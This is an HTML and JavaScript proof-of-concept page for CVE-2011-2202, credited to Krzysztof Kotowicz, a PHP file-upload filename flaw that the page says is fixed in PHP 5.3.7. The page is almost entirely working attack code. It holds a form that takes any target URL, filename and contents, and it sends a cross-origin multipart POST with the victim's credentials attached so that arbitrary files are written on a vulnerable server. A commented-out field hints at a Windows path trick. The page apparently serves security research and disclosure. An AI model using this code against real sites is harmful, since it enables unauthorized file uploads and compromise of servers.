<!DOCTYPE html> 
<html> 
<head>
<meta charset=utf-8 />
<link href='http://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'> 
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js" type="text/javascript"></script>
<style>
body {background: #333; color: #eee; font-family: 'Inconsolata', Verdana, sans-serif;}
a:link {color: green; }
a:visited {color: darkgreen;}
</style>
</head>
<body>
<h1>CVE 2011-2202 demo exploit</h1>
<p>by <a rel="me" href="http://blog.kotowicz.net">Krzysztof Kotowicz</a> | <a href="http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html">More info</a></a></p>
<p>Thhis will be fixed in PHP 5.3.7</p>
<label>URL: <input type="text" name="url"></label><br>
<label>Filename:<input name="filename" /></label><br>
<label>Contents:<textarea rows=10 cols=50 name="contents"></textarea></label><br>

<button type="button" id="upload" onclick="start()"><font size="+2">Upload!</font></button>
<script>
function byteValue(x) {
    return x.charCodeAt(0) & 0xff;
}

function toBytes(datastr) {
    var ords = Array.prototype.map.call(datastr, byteValue);
    var ui8a = new Uint8Array(ords);
    return ui8a.buffer;
}

if (typeof XMLHttpRequest.prototype.sendAsBinary == 'undefined' && Uint8Array) {
	XMLHttpRequest.prototype.sendAsBinary = function(datastr) {
	    this.send(toBytes(datastr));
	}
}

function fileUpload(uri, fileData, fileName) {
	  var fileSize = fileData.length,
	    boundary = "9849436581144108930470211272",
	    xhr = new XMLHttpRequest();

	  var additionalFields = {
			  //'dir' : 'c:\\boot.png:'
	  }

	  var fileFieldName = "file1";
	  
	  xhr.open("POST", uri, true);
	  xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary); // simulate a file MIME POST request.
	  xhr.setRequestHeader("Content-Length", fileSize);
	  xhr.withCredentials = "true";
 
	  xhr.onreadystatechange = function() {
	    if (xhr.readyState == 4) {
	      if ((xhr.status >= 200 && xhr.status <= 200) || xhr.status == 304) {
	        
	        if (xhr.responseText != "") {
	          alert(JSON.parse(xhr.responseText).msg); // display response.
	        }
	      } else if (xhr.status == 0) {
	      }
	    }
	  }
	  
	  var body = "";
	  
	  for (var i in additionalFields) {
		  if (additionalFields.hasOwnProperty(i)) {
			  body += addField(i, additionalFields[i], boundary);
		  }
	  }

	  body += addFileField(fileFieldName, fileData, fileName, boundary);
	  body += "--" + boundary + "--";
	  xhr.sendAsBinary(body);
	  return true;
}

function addField(name, value, boundary) {
	var c = "--" + boundary + "\r\n"
	c += "Content-Disposition: form-data; name='" + name + "'\r\n\r\n";
	c += value + "\r\n";
	return c;
}

function addFileField(name, value, filename, boundary) {
    var c = "--" + boundary + "\r\n"
    c += "Content-Disposition: form-data; name='" + name + "'; filename='" + filename + "'\r\n";
    c += "Content-Type: image/png\r\n\r\n";
    c += value + "\r\n";
    return c;	
}

function load_binary_resource(url) {
	  var req = new XMLHttpRequest();
	  req.open('GET', url, false);
	  //XHR binary charset opt by Marcus Granado 2006 [http://mgran.blogspot.com]
	  req.overrideMimeType('text/plain; charset=x-user-defined');
	  req.send(null);
	  if (req.status != 200) return '';
	  var bytes = Array.prototype.map.call(req.responseText, byteValue);
	  return String.fromCharCode.apply(this, bytes);
	  return req.responseText;
}

var start = function() {
	fileUpload($('input[name=url]').val(), $(':input[name=contents]').val(), $('input[name=filename]').val());
};

</script>
</div>
</body>
</html>
